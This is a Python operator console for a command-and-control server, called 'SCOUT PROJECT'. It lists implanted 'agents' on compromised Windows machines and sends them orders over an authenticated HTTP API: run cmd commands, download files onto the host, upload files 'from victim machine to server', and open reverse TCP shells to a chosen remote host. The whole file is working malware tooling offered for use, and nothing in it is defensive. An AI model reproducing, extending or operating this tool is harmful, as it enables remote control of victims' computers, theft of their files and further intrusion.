import sys
import json
import os
import sys
import requests
import struct
from datetime import datetime
from prettytable import PrettyTable

def PrintBanner():
    banner = '''
███████╗ ██████╗ ██████╗ ██╗   ██╗████████╗    ██████╗ ██████╗  ██████╗      ██╗███████╗ ██████╗████████╗
██╔════╝██╔════╝██╔═══██╗██║   ██║╚══██╔══╝    ██╔══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██╔════╝╚══██╔══╝
███████╗██║     ██║   ██║██║   ██║   ██║       ██████╔╝██████╔╝██║   ██║     ██║█████╗  ██║        ██║   
╚════██║██║     ██║   ██║██║   ██║   ██║       ██╔═══╝ ██╔══██╗██║   ██║██   ██║██╔══╝  ██║        ██║   
███████║╚██████╗╚██████╔╝╚██████╔╝   ██║       ██║     ██║  ██║╚██████╔╝╚█████╔╝███████╗╚██████╗   ██║   
╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   
    '''
    print(banner)

def p32(v):
    return struct.pack("<I", v)

def JobToString(task):
    return p32(task).decode()[::-1]

def Help():
    print("# listagent: List all agent")
    print("# select <agentId> : Select a agent to interactive with")
    print("# setsleep <sleep time in seconds>: Set selected agent sleep time (time between each connect to C2)")
    print("# info: Show selected agent info")
    print("# cmd <command>: execute windows cmd")
    print("# download <url> <filePath>: Download file from url to filePath")
    print("# upload <filePath>: Upload filePath from victim machine to server")
    print("# reverseshell <remote host> <port>: Create reverse shell TCP")
    

def Verify(url, token):
    postData = {
    "token": token,
    "cmd": "verify"
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result and result["status"] == "Ok":
            return True
        return False
    else:
        return False

def ListAgent(url, token):
    postData = {
    "token": token,
    "cmd": "listagent"
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result and result["status"] == "Ok":
            agentList = result["agentList"]
            agentsTable = PrettyTable(["Agent ID", "Computer/User", "Last Seen"])
            for agent in agentList:
                agentsTable.add_row([str(agent["agentId"]), agent["info"], datetime.fromtimestamp(agent["lastSeen"])])
            print(agentsTable)
            return True
        return False
    else:
        return False

def SelectAgent(url, token, agentId):
    postData = {
    "token": token,
    "cmd": "info",
    "agentId": agentId
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result:
            if result["status"] == "Ok":
                return True
            elif result["status"] == "failed" and "error" in result:
                print("select err: " + result["error"])
                return False
            else:
                print("select err: unknown")
                return False
    else:
        print("select err: Request to server failed!")
        return False

def AgentInfo(url, token, agentId):
    postData = {
    "token": token,
    "cmd": "info",
    "agentId": agentId
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result:
            if result["status"] == "Ok":
                # Print agent info
                print("# Agent Id: %d" % result["agentId"])
                print("# Computer/User: %s" % result["info"])
                print("# Last seen: %s" % datetime.fromtimestamp(result["lastSeen"]))
                print("# Sleep time: %s second(s)" % result["sleepTime"])
                print("# Job to be executed next: %s" % JobToString(result["currentJob"]))
                print("# Job to be executed next (params): %s" % result["currentJobParams"])
                print("# Last job: %s" % JobToString(result["previousJob"]))
                print("# Last job result: %s" % result["jobResult"])
            elif result["status"] == "failed" and "error" in result:
                print("info err: " + result["error"])
                return False
            else:
                print("info err: unknown")
                return False
    else:
        print("info err: Request to server failed!")
        return False

def SetSleep(url, token, agentId, sleepTime):
    postData = {
    "token": token,
    "cmd": "setsleep",
    "agentId": agentId,
    "sleepTime": sleepTime
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result:
            if result["status"] == "Ok":
                return True
    print("setsleep failed")
    return False

def DoCommand(url, token, agentId, command):
    postData = {
    "token": token,
    "cmd": "command",
    "agentId": agentId,
    "param": command,
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result:
            if result["status"] == "Ok":
                return True
            elif result["status"] == "failed":
                print("cmd err: %s" % result["error"])
                return False
    else:
        print("cmd failed")
        return False

def DoDownload(url, token, agentId, downloadUrl, downloadFile):
    postData = {
    "token": token,
    "cmd": "download",
    "agentId": agentId,
    "downloadUrl": downloadUrl,
    "downloadFile": downloadFile
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result:
            if result["status"] == "Ok":
                return True
            elif result["status"] == "failed":
                print("download err: %s" % result["error"])
                return False
    else:
        print("download failed")
        return False

def DoUpload(url, token, agentId, uploadFile):
    postData = {
    "token": token,
    "cmd": "upload",
    "agentId": agentId,
    "uploadFile": uploadFile
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result:
            if result["status"] == "Ok":
                return True
            elif result["status"] == "failed":
                print("upload err: %s" % result["error"])
                return False
    else:
        print("upload failed")
        return False

def DoReverseShell(url, token, agentId, remoteHost, port):
    postData = {
    "token": token,
    "cmd": "reverseshell",
    "agentId": agentId,
    "remoteHost": remoteHost,
    "port": port
    }
    
    jsonData = json.dumps(postData)
    response = requests.post(url, json=jsonData)
    if response.status_code == 200:
        result = response.json()
        if "status" in result:
            if result["status"] == "Ok":
                return True
            elif result["status"] == "failed":
                print("reverseshell err: %s" % result["error"])
                return False
    else:
        print("reverseshell failed")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("usage: %s <server> <token>" % (sys.argv[0]))
        exit()
    
    server = sys.argv[1] + "/client_api"
    token = sys.argv[2]
    if Verify(server, token) == False:
        print("Verify failed. Invalid token?")
        exit()
        
    PrintBanner()
    
    selectedAgent = 0
    while True:
        if selectedAgent == 0:
            inputFmt = ">>> "
        else:
            inputFmt = "[%d]>>> " % selectedAgent
        
        rawCmd = input(inputFmt)
        cmd = rawCmd.split(" ")
        if cmd[0] == "listagent":
            ListAgent(server, token)
        elif cmd[0] == "select":
            agentId = int(cmd[1])
            if SelectAgent(server, token, agentId) == True:
                selectedAgent = agentId
        elif cmd[0] == "help":
            Help()
        else:
            if selectedAgent == 0:
                print("Please select agent first")
            else:
                if cmd[0] == "info":
                    AgentInfo(server, token, selectedAgent)
                elif cmd[0] == "setsleep":
                    SetSleep(server, token, selectedAgent, int(cmd[1]))
                elif cmd[0] == "cmd":
                    DoCommand(server, token, selectedAgent, rawCmd[4:])
                elif cmd[0] == "download":
                    url = cmd[1]
                    downloadFile = rawCmd[rawCmd.find(cmd[2]):]
                    DoDownload(server, token, selectedAgent, url, downloadFile)
                elif cmd[0] == "upload":
                    uploadFile = rawCmd[7:]
                    DoUpload(server, token, selectedAgent, uploadFile)
                elif cmd[0] == "reverseshell":
                    DoReverseShell(server, token, selectedAgent, cmd[1], int(cmd[2]))
                else:
                    print("Unknown command '%s'. Try 'help'" % cmd[0])
        
            